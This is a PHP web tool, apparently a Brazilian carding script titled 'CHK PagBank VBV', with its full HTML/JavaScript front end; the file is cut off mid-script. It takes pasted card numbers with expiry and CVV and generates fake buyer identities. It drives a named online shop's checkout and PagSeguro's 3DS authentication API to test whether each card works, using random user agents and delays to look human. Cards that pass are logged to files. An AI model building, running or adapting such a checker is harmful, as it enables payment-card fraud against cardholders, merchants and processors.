<?php
error_reporting(0);
ignore_user_abort(true);
set_time_limit(0);

$CHAVE_PUBLICA = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoeeFRGFVfaZdmQMVrx/mWyw4C5DkM/l/QcxPOEjlvWyRwLzIRH+wgei5C5EB2OWx9tMlG6sBhboOf4c/0F6CgIUGfjKkj9SJltFUwMwbM3lO3q3Nk9oFFMFjcvqnn127OAG8MZFX/d174JBXSm30w5ibn8iGbUCP12HpzyHIHOd7Fx/fpFB6L//JD074TKLVWSTcHNd3b1LLRGmhXEWQlQlbkY2vwSmhK6oGBXRgVfgB0YQaQVQctOkP0TIzQkPem96gCvMKbPuZmfG681cJ5M3IvtApiWQDMMGvQt1QBXTf1KG+qxjh4lbVek55yxQmHBCPKqE4HC8fv2V8pkEtSQIDAQAB';

// Carregar User Agents
$userAgents = [];
if (file_exists('user_agents.json')) {
    $userAgents = json_decode(file_get_contents('user_agents.json'), true);
}
if (empty($userAgents)) {
    $userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
}

function getUserAgent() {
    global $userAgents;
    return $userAgents[array_rand($userAgents)];
}

function randomDelay($min = 2, $max = 5) {
    $delay = rand($min * 1000000, $max * 1000000);
    usleep($delay);
}

function deletarCookies() {
    $cookieFile = getcwd() . '/cookies.txt';
    if (file_exists($cookieFile)) unlink($cookieFile);
}

function criptografarCartao($numero, $mes, $ano, $cvv) {
    global $CHAVE_PUBLICA;
    $pan = preg_replace('/\D/', '', $numero);
    $mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
    $ano = strlen($ano) == 2 ? '20' . $ano : $ano;
    $holder = "TITULAR DO CARTAO";
    $timestamp = round(microtime(true) * 1000);
    $payload = "$pan;$cvv;$mes;$ano;$holder;$timestamp";
    $chavePublica = "-----BEGIN PUBLIC KEY-----\n" . chunk_split($CHAVE_PUBLICA, 64, "\n") . "-----END PUBLIC KEY-----";
    $publicKey = openssl_pkey_get_public($chavePublica);
    if (!$publicKey) return null;
    openssl_public_encrypt($payload, $encrypted, $publicKey, OPENSSL_PKCS1_PADDING);
    return base64_encode($encrypted);
}

function extrairSessaoPagSeguro($html) {
    if (preg_match('/var\s+pagseguro_connect_3d_session\s*=\s*[\'"]([^\'"]+)[\'"]/i', $html, $match)) return $match[1];
    if (preg_match('/pagseguro_connect_3d_session\s*=\s*[\'"]([^\'"]+)[\'"]/i', $html, $match)) return $match[1];
    return null;
}

function extrairMensagem($html) {
    $padroes = [
        '/<div[^>]*class=["\']challengeInfoText["\'][^>]*>(.*?)<\/div>/is',
        '/id=["\']CredentialId-0a-label["\'][^>]*>(.*?)<\/label>/is',
        '/<div[^>]*class=["\']container_body_text["\'][^>]*>(.*?)<\/div>/is',
        '/id=["\']info_message_auth["\'][^>]*>(.*?)<\/div>/is',
        '/<p[^>]*id=["\']Body1["\'][^>]*>(.*?)<\/p>/is',
        '/<p[^>]*class=["\']challenge-info-sub-header["\'][^>]*>(.*?)<\/p>/is',
        '/<span[^>]*id=["\']errorMessageText["\'][^>]*>(.*?)<\/span>/is',
        '/<div[^>]*class=["\']error-message["\'][^>]*>(.*?)<\/div>/is',
        '/<h1[^>]*>(.*?)<\/h1>/is'
    ];
    foreach ($padroes as $padrao) {
        if (preg_match($padrao, $html, $match)) {
            $texto = trim(strip_tags($match[1]));
            if (!empty($texto)) return $texto;
        }
    }
    return '';
}

function gerarNome() {
    $firstNames = ['Carlos', 'Joao', 'Pedro', 'Lucas', 'Gabriel', 'Rafael', 'Felipe', 'Bruno', 'Daniel', 'Thiago', 'Rodrigo', 'Alexandre', 'Marcelo', 'Ricardo', 'Eduardo', 'Paulo', 'Andre', 'Fernando', 'Sergio', 'Renato', 'Ana', 'Maria', 'Julia', 'Beatriz', 'Camila', 'Fernanda', 'Patricia', 'Jessica', 'Larissa', 'Amanda', 'Roberto', 'Jose', 'Antonio', 'Francisco', 'Luiz', 'Vinicius', 'Diego', 'Leonardo', 'Matheus', 'Guilherme'];
    $lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho', 'Almeida', 'Nascimento', 'Araujo', 'Barbosa', 'Mendes', 'Nunes', 'Rocha', 'Cruz', 'Cardoso', 'Correia', 'Melo', 'Teixeira', 'Dias', 'Monteiro', 'Moura', 'Goncalves'];
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];
    return ['full' => $firstName . ' ' . $lastName, 'first' => $firstName, 'last' => $lastName];
}

function gerarEmail($firstName, $lastName) {
    $domains = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com.br', 'bol.com.br', 'uol.com.br'];
    $domain = $domains[array_rand($domains)];
    $email = strtolower($firstName . '.' . $lastName . rand(1, 999) . '@' . $domain);
    return preg_replace('/[^a-z0-9.@]/', '', $email);
}

function gerarEndereco() {
    $streets = ['Rua das Flores', 'Av Brasil', 'Rua Augusta', 'Rua dos Pinheiros', 'Av Paulista', 'Rua Vergueiro', 'Rua Augusta', 'Rua da Consolacao'];
    $cities = ['Sao Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Brasilia', 'Curitiba', 'Porto Alegre', 'Salvador', 'Recife'];
    $states = ['SP', 'RJ', 'MG', 'DF', 'PR', 'RS', 'BA', 'PE'];
    $postalCodes = ['01234000', '01311000', '01414000', '01533000', '02047000', '03015000', '04015000', '05015000'];
    return [
        'street' => $streets[array_rand($streets)],
        'number' => rand(10, 999),
        'city' => $cities[array_rand($cities)],
        'regionCode' => $states[array_rand($states)],
        'postalCode' => $postalCodes[array_rand($postalCodes)]
    ];
}

function gerarTelefone() {
    $ddd = ['11', '21', '31', '41', '51', '61', '71', '81', '91'];
    return $ddd[array_rand($ddd)] . rand(900000000, 999999999);
}

// Controle de pause/stop
session_start();
if (isset($_POST['action'])) {
    if ($_POST['action'] === 'pause') {
        $_SESSION['processing'] = 'paused';
        echo json_encode(['status' => 'paused']);
    } elseif ($_POST['action'] === 'stop') {
        $_SESSION['processing'] = 'stopped';
        echo json_encode(['status' => 'stopped']);
    } elseif ($_POST['action'] === 'resume') {
        $_SESSION['processing'] = 'running';
        echo json_encode(['status' => 'running']);
    }
    exit;
}

// AJAX endpoint para processamento em tempo real
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest') {
    header('Content-Type: application/json');
    
    // Verificar status de processamento
    if (isset($_SESSION['processing']) && $_SESSION['processing'] === 'paused') {
        echo json_encode(['status' => 'paused', 'index' => $_POST['index'] ?? 0]);
        exit;
    }
    
    if (isset($_SESSION['processing']) && $_SESSION['processing'] === 'stopped') {
        echo json_encode(['status' => 'stopped']);
        exit;
    }
    
    $cartao = $_POST['cartao'] ?? '';
    $index = $_POST['index'] ?? 0;
    
    if ($cartao) {
        $partes = preg_split('/[|:;,\-\/]+/', trim($cartao));
        if (count($partes) >= 4) {
            $cc = trim($partes[0]);
            $mes = trim($partes[1]);
            $ano = trim($partes[2]);
            $cvv = trim($partes[3]);
            
            if (strlen($ano) == 4) $ano = substr($ano, -2);
            if (strlen($mes) == 1) $mes = "0" . $mes;
            
            $nome = gerarNome();
            $email = gerarEmail($nome['first'], $nome['last']);
            $endereco = gerarEndereco();
            $telefone = gerarTelefone();
            
            $encryptedCard = criptografarCartao($cc, $mes, $ano, $cvv);
            
            if (!$encryptedCard) {
                echo json_encode(['index' => $index, 'resultado' => ['status' => 'error', 'msg' => '❌ REPROVADO | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | ERRO CRIPTOGRAFIA']]);
                exit;
            }
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            
            $userAgent = getUserAgent();
            
            // Delay inicial (simula digitação)
            randomDelay(2, 5);
            
            // Navegação inicial - add to cart
            curl_setopt($ch, CURLOPT_URL, 'https://cestasplenitude.com.br/?add-to-cart=9945');
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['User-Agent: ' . $userAgent, 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9', 'Accept-Language: pt-BR,pt;q=0.9']);
            curl_exec($ch);
            randomDelay(1, 3);
            
            // Home
            curl_setopt($ch, CURLOPT_URL, 'https://cestasplenitude.com.br/');
            curl_exec($ch);
            randomDelay(1, 3);
            
            // Checkout
            curl_setopt($ch, CURLOPT_URL, 'https://cestasplenitude.com.br/finalizar-compra/');
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['User-Agent: ' . $userAgent, 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9', 'Accept-Language: pt-BR,pt;q=0.9', 'Referer: https://cestasplenitude.com.br/']);
            $checkout_html = curl_exec($ch);
            randomDelay(1, 3);
            
            $sessao_pagseguro = extrairSessaoPagSeguro($checkout_html);
            
            if (!$sessao_pagseguro) {
                curl_close($ch);
                echo json_encode(['index' => $index, 'resultado' => ['status' => 'error', 'msg' => '❌ REPROVADO | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | SESSAO NAO ENCONTRADA']]);
                exit;
            }
            
            // Autenticação
            $auth_payload = json_encode([
                "paymentMethod" => ["type" => "CREDIT_CARD", "installments" => 1, "card" => ["encrypted" => $encryptedCard]],
                "dataOnly" => false,
                "customer" => ["name" => $nome['full'], "email" => $email, "phones" => [["country" => "55", "area" => substr($telefone, 0, 2), "number" => substr($telefone, 2), "type" => "MOBILE"]]],
                "amount" => ["value" => 17500, "currency" => "BRL"],
                "billingAddress" => ["street" => $endereco['street'], "number" => $endereco['number'], "complement" => "n/d", "regionCode" => $endereco['regionCode'], "country" => "BRA", "city" => $endereco['city'], "postalCode" => $endereco['postalCode']],
                "deviceInformation" => ["httpBrowserColorDepth" => 32, "httpBrowserJavaEnabled" => false, "httpBrowserJavaScriptEnabled" => true, "httpBrowserLanguage" => "pt-BR", "httpBrowserScreenHeight" => 1536, "httpBrowserScreenWidth" => 864, "httpBrowserTimeDifference" => 180, "httpDeviceChannel" => "Browser", "userAgentBrowserValue" => $userAgent]
            ]);
            
            curl_setopt($ch, CURLOPT_URL, 'https://sdk.pagseguro.com/checkout-sdk/3ds/authentications');
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $auth_payload);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: ' . $sessao_pagseguro, 'Content-Type: application/json', 'Origin: https://cestasplenitude.com.br', 'Referer: https://cestasplenitude.com.br/', 'User-Agent: ' . $userAgent, 'Accept: */*']);
            $auth_response = curl_exec($ch);
            $auth_data = json_decode($auth_response, true);
            randomDelay(1, 2);
            
            $three_ds_id = $auth_data['id'] ?? '';
            
            if (!$three_ds_id) {
                curl_close($ch);
                $status = $auth_data['status'] ?? ($auth_data['message'] ?? 'FALHA NA AUTENTICACAO');
                echo json_encode(['index' => $index, 'resultado' => ['status' => 'error', 'msg' => '❌ REPROVADO | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | ' . $status]]);
                exit;
            }
            
            // Confirmação
            curl_setopt($ch, CURLOPT_URL, 'https://sdk.pagseguro.com/checkout-sdk/3ds/authentications/' . $three_ds_id);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: ' . $sessao_pagseguro, 'Content-Type: application/json', 'Origin: https://cestasplenitude.com.br', 'Referer: https://cestasplenitude.com.br/', 'User-Agent: ' . $userAgent]);
            $confirm_response = curl_exec($ch);
            $confirm_data = json_decode($confirm_response, true);
            randomDelay(1, 2);
            
            $status = $confirm_data['status'] ?? '';
            
            if ($status === 'SUCCESS' || $status === 'SUCCESS_WITHOUT_CHALLENGE') {
                curl_close($ch);
                file_put_contents('aprovadas.txt', $cc . '|' . $mes . '|' . $ano . '|' . $cvv . PHP_EOL, FILE_APPEND);
                echo json_encode(['index' => $index, 'resultado' => ['status' => 'approved', 'msg' => '✅ APROVADO | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | Pagamento Aprovado']]);
            } elseif ($status === 'REQUIRE_CHALLENGE') {
                $challenge = $confirm_data['challenge'] ?? [];
                $acs_url = $challenge['acsUrl'] ?? '';
                $creq = $challenge['payload'] ?? '';
                
                if ($acs_url && $creq) {
                    curl_setopt($ch, CURLOPT_URL, $acs_url);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, 'creq=' . urlencode($creq));
                    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded', 'Origin: https://cestasplenitude.com.br', 'Referer: https://cestasplenitude.com.br/', 'User-Agent: ' . $userAgent]);
                    $challenge_response = curl_exec($ch);
                    $mensagem = extrairMensagem($challenge_response);
                    
                    curl_close($ch);
                    
                    if ($mensagem) {
                        file_put_contents('aprovadas.txt', $cc . '|' . $mes . '|' . $ano . '|' . $cvv . PHP_EOL, FILE_APPEND);
                        echo json_encode(['index' => $index, 'resultado' => ['status' => 'approved', 'msg' => '✅ APROVADO | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | ' . $mensagem]]);
                    } else {
                        file_put_contents('vbv.txt', $cc . '|' . $mes . '|' . $ano . '|' . $cvv . PHP_EOL, FILE_APPEND);
                        echo json_encode(['index' => $index, 'resultado' => ['status' => 'approved', 'msg' => '⚠️ VBV ON | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | 3D Secure Necessário']]);
                    }
                } else {
                    curl_close($ch);
                    echo json_encode(['index' => $index, 'resultado' => ['status' => 'error', 'msg' => '❌ REPROVADO | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | VBV OFF/SMS OFF']]);
                }
            } else {
                curl_close($ch);
                $mensagem = $confirm_data['message'] ?? ($confirm_data['error'] ?? $status);
                echo json_encode(['index' => $index, 'resultado' => ['status' => 'error', 'msg' => '❌ REPROVADO | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | ' . $mensagem]]);
            }
        } else {
            echo json_encode(['index' => $index, 'resultado' => ['status' => 'error', 'msg' => '❌ REPROVADO | Formato inválido']]);
        }
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHK PagBank VBV · 3DS Validator</title>
    <link rel="icon" type="image/png" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%236c6cff'/%3E%3Ctext x='50' y='68' font-size='50' text-anchor='middle' fill='white' font-weight='bold'%3E✓%3C/text%3E%3C/svg%3E">
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: #050508;
            min-height: 100vh;
            padding: 2rem;
            position: relative;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 50% 0%, rgba(30,30,50,1) 0%, rgba(5,5,8,1) 100%);
            z-index: -2;
        }
        
        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: repeating-linear-gradient(transparent 0px, transparent 1px, rgba(100,100,255,0.03) 1px, rgba(100,100,255,0.03) 2px);
            z-index: -1;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 3rem;
        }
        
        .title {
            font-size: 3rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ffffff 0%, #a0a0ff 30%, #6c6cff 70%, #ffffff 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            animation: shine 3s linear infinite;
            letter-spacing: -0.02em;
        }
        
        @keyframes shine {
            to { background-position: 200% center; }
        }
        
        .badge {
            display: inline-block;
            margin-top: 1rem;
            padding: 0.3rem 1rem;
            background: rgba(108,108,255,0.1);
            border: 1px solid rgba(108,108,255,0.3);
            border-radius: 40px;
            color: #8b8bff;
            font-size: 0.75rem;
            font-weight: 500;
            letter-spacing: 1px;
        }
        
        .glass-card {
            background: rgba(15,15,20,0.7);
            backdrop-filter: blur(20px);
            border-radius: 28px;
            border: 1px solid rgba(255,255,255,0.08);
            overflow: hidden;
            margin-bottom: 2rem;
        }
        
        .card-header {
            padding: 1.5rem 2rem;
            background: rgba(25,25,35,0.5);
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        
        .card-header h2 {
            color: #e8e8ff;
            font-size: 1.2rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .card-body {
            padding: 2rem;
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        .form-group label {
            display: block;
            color: #9a9ac0;
            margin-bottom: 0.5rem;
            font-size: 0.8rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        textarea {
            width: 100%;
            padding: 1rem;
            background: #0a0a0e;
            border: 1.5px solid #2a2a35;
            border-radius: 20px;
            color: #e0e0e0;
            font-family: 'Monaco', 'Courier New', monospace;
            font-size: 0.85rem;
            resize: vertical;
            transition: all 0.2s;
        }
        
        textarea:focus {
            outline: none;
            border-color: #6c6cff;
            background: #0d0d12;
        }
        
        .button-group {
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
        }
        
        .btn {
            flex: 1;
            padding: 1rem;
            border-radius: 40px;
            font-size: 0.9rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            border: none;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn-start {
            background: linear-gradient(135deg, #00ff96, #00cc77);
            color: #000;
        }
        
        .btn-start:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(0,255,150,0.3);
        }
        
        .btn-pause {
            background: linear-gradient(135deg, #ffc107, #ff9800);
            color: #000;
        }
        
        .btn-pause:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(255,193,7,0.3);
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #ff4444, #cc0000);
            color: #fff;
        }
        
        .btn-stop:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(255,68,68,0.3);
        }
        
        .btn-copy {
            background: linear-gradient(135deg, #6c6cff, #4a4aff);
            color: #fff;
        }
        
        .btn-copy:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(108,108,255,0.4);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 1rem;
            margin-bottom: 2rem;
        }
        
        .stat-item {
            background: rgba(10,10,15,0.6);
            border-radius: 20px;
            padding: 1.2rem;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.05);
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ffffff, #a0a0ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .stat-label {
            font-size: 0.7rem;
            color: #7a7a9a;
            margin-top: 0.3rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .results-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1.5rem;
        }
        
        .result-panel {
            background: rgba(10,10,15,0.5);
            border-radius: 24px;
            overflow: hidden;
            border: 1px solid rgba(255,255,255,0.05);
        }
        
        .panel-title {
            padding: 1rem 1.5rem;
            font-weight: 700;
            font-size: 0.9rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        
        .panel-title.approved {
            background: linear-gradient(135deg, rgba(0,255,150,0.08), rgba(0,200,100,0.02));
            color: #00ff96;
        }
        
        .panel-title.rejected {
            background: linear-gradient(135deg, rgba(255,50,50,0.08), rgba(200,0,0,0.02));
            color: #ff4444;
        }
        
        .count-badge {
            background: rgba(255,255,255,0.1);
            padding: 0.2rem 0.6rem;
            border-radius: 20px;
            font-size: 0.75rem;
        }
        
        .results-list {
            padding: 1rem;
            max-height: 500px;
            overflow-y: auto;
            min-height: 300px;
        }
        
        .result-item {
            padding: 0.7rem 1rem;
            margin-bottom: 0.5rem;
            background: rgba(255,255,255,0.02);
            border-radius: 16px;
            font-family: 'Monaco', 'Courier New', monospace;
            font-size: 0.75rem;
            border-left: 3px solid;
            animation: slideIn 0.3s ease;
            word-break: break-all;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-10px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .result-item.approved {
            border-left-color: #00ff96;
            color: #b0ffd0;
        }
        
        .result-item.rejected {
            border-left-color: #ff4444;
            color: #ffb0b0;
        }
        
        .empty-state {
            text-align: center;
            padding: 3rem;
            color: #5a5a7a;
            font-size: 0.8rem;
        }
        
        .progress-container {
            margin-top: 1.5rem;
            display: none;
        }
        
        .progress-container.active {
            display: block;
        }
        
        .progress-bar {
            height: 2px;
            background: rgba(108,108,255,0.2);
            border-radius: 2px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #6c6cff, #a0a0ff);
            width: 0%;
            transition: width 0.3s;
            border-radius: 2px;
        }
        
        .progress-text {
            text-align: center;
            margin-top: 0.5rem;
            font-size: 0.7rem;
            color: #7a7a9a;
        }
        
        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-running {
            background-color: #00ff96;
            box-shadow: 0 0 8px #00ff96;
            animation: pulse 1s infinite;
        }
        
        .status-paused {
            background-color: #ffc107;
        }
        
        .status-stopped {
            background-color: #ff4444;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        ::-webkit-scrollbar {
            width: 4px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(255,255,255,0.05);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: rgba(108,108,255,0.4);
            border-radius: 4px;
        }
        
        @media (max-width: 768px) {
            body { padding: 1rem; }
            .title { font-size: 1.5rem; }
            .results-container { grid-template-columns: 1fr; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .button-group { flex-direction: column; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="title">CHK PAGBANK VBV</div>
            <div class="badge">⚡ 3DS SECURE VALIDATOR ⚡</div>
        </div>
        
        <div class="glass-card">
            <div class="card-header">
                <h2>⌨️ INPUT TERMINAL</h2>
            </div>
            <div class="card-body">
                <div class="form-group">
                    <label>CARTOES (um por linha)</label>
                    <textarea id="cartoesInput" rows="8" placeholder="4111111111111111|12|26|123&#10;5555555555554444|10|25|789&#10;378282246310005|12|25|1234"></textarea>
                </div>
                <div class="button-group">
                    <button class="btn btn-start" id="startBtn">▶ INICIAR</button>
                    <button class="btn btn-pause" id="pauseBtn">⏸ PAUSAR</button>
                    <button class="btn btn-stop" id="stopBtn">⏹ PARAR</button>
                    <button class="btn btn-copy" id="copyBtn">📋 COPIAR APROVADAS</button>
                </div>
                
                <div class="progress-container" id="progressContainer">
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <div class="progress-text" id="progressText">Aguardando início...</div>
                </div>
            </div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-item">
                <div class="stat-value" id="totalCount">0</div>
                <div class="stat-label">Total Processado</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="approvedCount" style="background: linear-gradient(135deg, #00ff96, #00cc77); -webkit-background-clip: text; background-clip: text;">0</div>
                <div class="stat-label">Aprovados</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="rejectedCount" style="background: linear-gradient(135deg, #ff6666, #ff4444); -webkit-background-clip: text; background-clip: text;">0</div>
                <div class="stat-label">Reprovados</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="vbvCount" style="background: linear-gradient(135deg, #ffc107, #ff9800); -webkit-background-clip: text; background-clip: text;">0</div>
                <div class="stat-label">VBV/SMS</div>
            </div>
        </div>
        
        <div class="results-container">
            <div class="result-panel">
                <div class="panel-title approved">
                    ✓ APROVADOS
                    <span class="count-badge" id="approvedBadge">0</span>
                </div>
                <div class="results-list" id="approvedList">
                    <div class="empty-state">aguardando processamento...</div>
                </div>
            </div>
            
            <div class="result-panel">
                <div class="panel-title rejected">
                    ✗ REPROVADOS
                    <span class="count-badge" id="rejectedBadge">0</span>
                </div>
                <div class="results-list" id="rejectedList">
                    <div class="empty-state">aguardando processamento...</div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let isProcessing = false;
        let isPaused = false;
        let shouldStop = false;
        let cartoesList = [];
        let currentIndex = 0;
        let approved = [];
        let rejected = [];
        let vbv = [];
        
        const startBtn = document.getElementById('startBtn');
        const pauseBtn = document.getElementById('pauseBtn');
        const stopBtn = document.getElementById('stopBtn');
        const copyBtn = document.getElementById('copyBtn');
        const cartoesInput = document.getElementById('cartoesInput');
        const progressContainer = document.getElementById('progressContainer');
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');
        
        const totalCountSpan = document.getElementById('totalCount');
        const approvedCountSpan = document.getElementById('approvedCount');
        const rejectedCountSpan = document.getElementById('rejectedCount');
        const vbvCountSpan = document.getElementById('vbvCount');
        const approvedBadge = document.getElementById('approvedBadge');
        const rejectedBadge = document.getElementById('rejectedBadge');
        const approvedList = document.getElementById('approvedList');
        const rejectedList = document.getElementById('rejectedList');
        
        function updateStats() {
            totalCountSpan.textContent = approved.length + rejected.length + vbv.length;
            approvedCountSpan.textContent = approved.length;
            rejectedCountSpan.textContent = rejected.length;
            vbvCountSpan.textContent = vbv.length;
            approvedBadge.textContent = approved.length;
            rejectedBadge.textContent = rejected.length;
        }
        
        function addResult(result) {
            if (result.msg.includes('VBV ON')) {
                vbv.push(result);
                result.status = 'approved';
            }
            
            if (result.status === 'approved') {
                approved.push(result);
                if (approvedList.querySelector('.empty-state')) approvedList.innerHTML = '';
                const item = document.createElement('div');
                item.className = 'result-item approved';
                item.textContent = result.msg;
                approvedList.appendChild(item);
            } else {
                rejected.push(result);
                if (rejectedList.querySelector('.empty-state')) rejectedList.innerHTML = '';
                const item = document.createElement('div');
                item.className = 'result-item rejected';
                item.textContent = result.msg;
                rejectedList.appendChild(item);
            }
            
            updateStats();
            
            if (result.status === 'approved') {
                approvedList.scrollTop = approvedList.scrollHeight;
            } else {
                rejectedList.scrollTop = rejectedList.scrollHeight;
            }
        }
        
        function updateProgress() {
            const percent = (currentIndex / cartoesList.length) * 100;
            progressFill.style.width = `${percent}%`;
            progressText.textContent = `Processando ${currentIndex} de ${cartoesList.length} cartões... | Aprovados: ${approved.length} | VBV: ${vbv.length} | Reprovados: ${rejected.length}`;
        }
        
        async function sendAction(action) {
            const formData = new FormData();
            formData.append('action', action);
            await fetch(window.location.href, {
                method: 'POST',
                body: formData
            });
        }
        
        async function processNext() {
            if (shouldStop) {
                isProcessing = false;
                shouldStop = false;
                startBtn.disabled = false;
                startBtn.textContent = '▶ INICIAR';
                progressText.textContent = `⏹ Parado! ${approved.length} aprovados, ${vbv.length} VBV, ${rejected.length} reprovados`;
                await sendAction('stop');
                return;
            }
            
            if (isPaused) {
                setTimeout(() => processNext(), 1000);
                return;
            }
            
            if (currentIndex >= cartoesList.length) {
                isProcessing = false;
                startBtn.disabled = false;
                startBtn.textContent = '▶ INICIAR';
                progressText.textContent = `✓ Finalizado! ${approved.length} aprovados, ${vbv.length} VBV, ${rejected.length} reprovados`;
                return;
            }
            
            const cartao = cartoesList[currentIndex];
            if (!cartao.trim()) {
                currentIndex++;
                processNext();
                return;
            }
            
            updateProgress();
            
            try {
                const formData = new FormData();
                formData.append('cartao', cartao);
                formData.append('index', currentIndex);
                
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.status === 'paused') {
                    isPaused = true;
                    pauseBtn.textContent = '▶ RETOMAR';
                    progressText.textContent = '⏸ PAUSADO - Clique em RETOMAR para continuar';
                    return;
                }
                
                if (data.status === 'stopped') {
                    shouldStop = true;
